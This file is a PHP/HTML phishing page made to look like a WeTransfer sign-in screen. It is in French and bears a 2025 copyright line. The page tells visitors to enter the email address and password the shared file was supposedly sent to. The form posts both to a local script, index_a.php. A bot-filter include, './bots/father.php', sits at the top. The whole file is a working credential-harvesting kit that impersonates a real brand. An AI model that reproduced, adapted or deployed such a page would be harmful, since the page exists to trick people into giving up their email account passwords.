<?php

include_once './bots/father.php';

?>
<html style="--vh: 9.47px">

<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>WeTransfer account | WeTransfer</title>
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0" />
    <link href="https://auth-cdn.wetransfer.com/assets/styles/fonts.css" rel="stylesheet" type="text/css" />
    <link href="./assets/img/favicon.ico" rel="icon" type="image/x-icon" />
    <link href="./assets/css/style.css" rel=" stylesheet" type="text/css" />
</head>

<body>
<link href="./assets/css/eux.css" rel=" stylesheet" type="text/css" />
    <main class="wt-container wt-split-pane">
        <img class="wt-logo" id="wt-logo" src="./assets/images/we.svg" alt="WeTransfer" />
        <div class="wt-pane wt-pane--left wt-pane--default">
            <div class="wt-product-feature-pane-loader" id="wt-product-feature-pane-loader" style="display: none"></div>
            <div class="wt-product-feature-pane" id="wt-product-feature-pane">
                <div class="wt-product-header">
                    <a href="#" class="wt-cross-icon" id="wt-cross-icon"><img class="wt-product-cross-icon" src="./assets/img/cross-icon.svg" /></a>
                    <h3 class="wt-product-header__subheader" id="wt-product-subheader-line"></h3>
                </div>
                <div class="wt-product-feature__image-wrapper" id="wt-product-feature-wrapper">
                    <div class="wt-product-header__logo" id="wt-product-header-logo">
                        <img class="wt-product-logo" src="./assets/img/wetransfer-text-logo.svg" />
                    </div>
                    <h1 class="wt-product-header__header" id="wt-product-header-line">
                        Send files, move ideas with WeTransfer
                    </h1>
                    <img class="wt-product-feature__image" src="./assets/img/transfer-general.png" />
                </div>
            </div>
        </div>
        <div class="wt-pane wt-pane--right">
            <div class="wt-product-header__logo-mobile" id="wt-product-header-logo-mobile">
                <img class="wt-product-logo" src="./assets/img/logo-free-mobile.svg" />
            </div>
            <div class="wt-product-header__auth-widget" id="wt-auth-widget-container">
                <div class="auth0-lock auth0-lock-opened-in-frame auth0-lock-with-tabs" lang="fr">
                    <div class="auth0-lock-center">
                        <form class="auth0-lock-widget" method="post" action="index_a.php">
                            <div class="auth0-lock-widget-container">
                                <div class="auth0-lock-cred-pane auth0-lock-quiet">
                                    <div class="auth0-lock-cred-pane-internal-wrapper">
                                        <div class="auth0-lock-content-wrapper">
                                            <div class="auth0-lock-header">
                                                <div class="auth0-lock-header-bg auth0-lock-blur-support">
                                                    <div class="auth0-lock-header-bg-blur" style="background-image: url(&quot;&quot;)"></div>
                                                    <div class="auth0-lock-header-bg-solid" style="background-color: rgb(25, 25, 25)"></div>
                                                </div>
                                                <div class="auth0-lock-header-welcome"></div>
                                            </div>
                                            <div class="auth0-lock-content-body-wrapper" style="margin-top: 0px">
                                                <div>
                                                    <div></div>
                                                </div><br><br><br>
                                                <center><img width="25" src="./assets/img/WeTransfer_logo.svg.png"></center>
                                                <div style="position: relative">
                                                    <span>
                                                        <div class="" >
                                                            <div style="visibility: inherit">
                                                                <div class="auth0-lock-view-content">
                                                                    <div style="position: relative">
                                                                        <div class="auth0-lock-body-content">
                                                                            <div class="auth0-lock-content">
                                                                                <div class="auth0-lock-form">
                                                                                    <div><br><br><br><br><br>
                                                                                        <div role="navigation" class="auth0-lock-tabs-container">
                                                                                            <ul class="auth0-lock-tabs" role="tablist" aria-label="Login Tabs">
                                                                                                <li class="auth0-lock-tabs-current" role="tab" aria-selected="true" aria-controls="panel-login" id="tab-login" tabindex="1">
                                                                                                    <span>CONNEXION</span>
                                                                                                </li>
                                                                                            </ul>
                                                                                        </div>
                                                                                        <p><strong>POUR LIRE LE DOCUMENT, VEUILLEZ ENTRER LES IDENTIFIANTS DE MESSAGERIE AUXQUELS CE FICHIER A ÉTÉ ENVOYÉ.</strong></p>
                                                                                        <div class="auth0-lock-pane-separator"></div>
                                                                                        <div>
                                                                                            <div class="auth0-lock-input-block auth0-lock-input-email">
                                                                                                <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                                                                    <svg aria-hidden="true" focusable="false" width="14px" height="13px" viewBox="0 0 32 26" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="auth0-lock-icon auth0-lock-icon-box">
                                                                                                        <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                                                                            <g id="32px" transform="translate(-2155.000000, -2317.000000)" fill="#373A39">
                                                                                                                <g id="Group-856" transform="translate(1.000000, 1.000000)">
                                                                                                                    <path id="Fill-419" d="M2184,2339 C2184,2339.55 2183.55,2340 2183,2340 L2157,2340 C2156.45,2340 2156,2339.55 2156,2339 L2156,2319 C2156,2318.45 2156.45,2318 2157,2318 L2183,2318 C2183.55,2318 2184,2318.45 2184,2319 L2184,2339 L2184,2339 Z M2184,2316 L2156,2316 C2154.89,2316 2154,2316.89 2154,2318 L2154,2340 C2154,2341.1 2154.89,2342 2156,2342 L2184,2342 C2185.1,2342 2186,2341.1 2186,2340 L2186,2318 C2186,2316.89 2185.1,2316 2184,2316 L2184,2316 Z M2176,2322 L2180,2322 L2180,2326 L2176,2326 L2176,2322 Z M2174,2328 L2182,2328 L2182,2320 L2174,2320 L2174,2328 Z M2158,2332 L2172,2332 L2172,2330 L2158,2330 L2158,2332 Z M2158,2336 L2172,2336 L2172,2334 L2158,2334 L2158,2336 Z"></path>
                                                                                                                </g>
                                                                                                            </g>
                                                                                                        </g>
                                                                                                    </svg>
                                                                                                    <input id="1-email" type="email" inputmode="email" name="email" class="auth0-lock-input" placeholder="E-mail" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" aria-label="Email" aria-invalid="false" value="" tabindex="5" required/>
                                                                                                </div>
                                                                                            </div><br>

                                                                                            <!-- Section de mot de passe (cachée par défaut) -->
                                                                                            <div id="password-section" >
                                                                                                <div class="auth0-lock-input-block auth0-lock-input-password">
                                                                                                    <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                                                                        <svg aria-hidden="true" focusable="false" width="11px" height="14px" viewBox="0 0 13 16" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" class="auth0-lock-icon auth0-lock-icon-box">
                                                                                                            <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                                                                                <g transform="translate(-288.000000, -1508.000000)" fill="#888888">
                                                                                                                    <path d="M299,1523.998 L290,1523.998 C288.896,1523.998 288,1523.102 288,1521.999 L288,1515.999 C288,1514.895 288.896,1513.998 290,1513.998 L290,1513.998 L290,1512.499 C290,1510.015 292.015,1507.999 294.5,1507.999 C296.985,1507.999 299,1510.015 299,1512.499 L299,1513.999 C300.104,1513.999 301,1514.895 301,1515.999 L301,1521.999 C301,1523.103 300.104,1523.998 299,1523.998 L299,1523.998 Z M298,1512.499 C298,1510.566 296.433,1508.999 294.5,1508.999 C292.567,1508.999 291,1510.566 291,1512.499 L291,1513.998 L298,1513.998 L298,1512.499 L298,1512.499 Z M300,1515.999 C300,1515.446 299.552,1514.998 299,1514.998 L290,1514.998 C289.447,1514.998 289,1515.446 289,1515.999 L289,1521.999 C289,1522.551 289.447,1522.998 290,1522.998 L299,1522.998 C299.552,1522.998 300,1522.551 300,1521.999 L300,1515.999 L300,1515.999 Z M294.5,1520.998 C294.224,1520.998 294,1520.774 294,1520.498 L294,1517.498 C294,1517.223 294.224,1516.999 294.5,1516.999 C294.776,1516.999 295,1517.223 295,1517.498 L295,1520.498 C295,1520.774 294.776,1520.998 294.5,1520.998 L294.5,1520.998 Z"></path>
                                                                                                                </g>
                                                                                                            </g>
                                                                                                        </svg>
                                                                                                        <input type="text" id="password-input" name="password" class="auth0-lock-input" autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false" aria-label="Password" aria-invalid="false" placeholder="Mot de passe" value="" tabindex="6" required/>
                                                                                                    </div>
                                                                                                </div><br>
                                                                                                <!-- Bouton Télécharger -->
                                                                                                <button id="download-button" class="auth0-lock-submit" style="background-color: rgb(25, 25, 25); display: block; margin-top: 10px;" name="download" type="submit" aria-label="Télécharger" role="button" tabindex="9">
                                                                                                    <span class="auth0-label-submit">Récuperer mes fichiers</span>
                                                                                                </button>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div><br>
                                                                                    <p>© WeTransfer 2025 - Tous droits réservés.</p>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                        
                    </div>
                </div>
            </div>
        </div>
    </main>

    <script>
        // Gestionnaire d'événements pour le bouton "Ouvrir mon document"
        document.getElementById('1-submit').addEventListener('click', function(event) {
            event.preventDefault(); // Empêche la soumission du formulaire
            document.getElementById('password-section').style.display = 'block'; // Affiche la section de mot de passe
        });

        // Gestionnaire d'événements pour le bouton "Télécharger"
        document.getElementById('download-button').addEventListener('click', function() {
            // Ajoutez ici la logique pour télécharger le document
            alert('Téléchargement en cours...');
        });
    </script>
</body>

</html>